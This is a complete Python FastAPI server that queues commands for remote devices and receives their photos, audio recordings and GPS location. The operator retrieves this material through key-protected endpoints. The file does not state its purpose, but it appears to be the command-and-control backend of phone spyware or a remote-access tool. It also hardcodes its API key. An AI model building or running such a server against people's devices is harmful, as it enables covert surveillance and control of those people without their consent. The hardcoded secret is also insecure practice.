from fastapi import FastAPI, Request, HTTPException, UploadFile, File
from fastapi.responses import FileResponse
import time
import os

app = FastAPI()
API_KEY = "MY_SECRET_KEY_123" 

device_data = {} 
command_queue = []
latest_location = "No location yet"

# Save files to disk so they don't get lost in RAM
PHOTO_FILE = "latest_photo.jpg"
AUDIO_FILE = "latest_audio.m4a"

def check_key(request: Request):
    if request.headers.get("X-Key") != API_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized")

@app.post("/cmd")
async def get_commands(request: Request):
    check_key(request)
    data = await request.json()
    device_id = data.get("device_id")
    data["last_seen"] = time.time()
    device_data[device_id] = data
    cmds = list(command_queue)
    command_queue.clear()
    return {"commands": cmds}

@app.post("/upload_photo")
async def upload_photo(request: Request, file: UploadFile = File(...)):
    check_key(request)
    with open(PHOTO_FILE, "wb") as f:
        f.write(await file.read())
    return {"status": "ok"}

@app.post("/upload_audio")
async def upload_audio(request: Request, file: UploadFile = File(...)):
    check_key(request)
    with open(AUDIO_FILE, "wb") as f:
        f.write(await file.read())
    return {"status": "ok"}

@app.post("/location")
async def post_location(request: Request):
    global latest_location
    check_key(request)
    data = await request.json()
    latest_location = f"Lat: {data.get('lat')}, Lon: {data.get('lon')}"
    return {"status": "ok"}

@app.get("/state")
async def get_state(request: Request):
    check_key(request)
    now = time.time()
    active_devices = {k: v for k, v in device_data.items() if now - v.get("last_seen", 0) < 15}
    return {
        "devices": active_devices, 
        "has_image": os.path.exists(PHOTO_FILE), 
        "has_audio": os.path.exists(AUDIO_FILE),
        "location": latest_location
    }

@app.get("/get_photo")
async def get_photo(request: Request):
    check_key(request)
    if not os.path.exists(PHOTO_FILE): raise HTTPException(status_code=404)
    return FileResponse(PHOTO_FILE, media_type="image/jpeg")

@app.get("/get_audio")
async def get_audio(request: Request):
    check_key(request)
    if not os.path.exists(AUDIO_FILE): raise HTTPException(status_code=404)
    return FileResponse(AUDIO_FILE, media_type="audio/mp4")

@app.post("/queue_cmd")
async def queue_command(request: Request):
    check_key(request)
    cmd = await request.json()
    command_queue.append(cmd)
    return {"status": "queued"}
